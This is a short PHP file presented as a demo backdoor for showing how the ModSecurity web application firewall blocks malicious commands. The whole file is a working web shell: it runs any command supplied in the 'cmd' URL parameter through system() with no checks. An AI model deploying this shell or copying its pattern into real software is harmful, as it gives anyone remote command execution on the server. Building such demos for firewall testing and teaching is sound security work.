<?php
// ModSecurity Demo Backdoor
// Purpose: To demonstrate how the Web Application Firewall (WAF) blocks malicious commands.

if (isset($_GET['cmd'])) {
    echo "<pre>";
    // This is a dangerous function that ModSecurity should detect and block.
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "<h3>ModSecurity Demo</h3>";
    echo "<p>Try running a command by adding <code>?cmd=whoami</code> to the URL.</p>";
}
?>
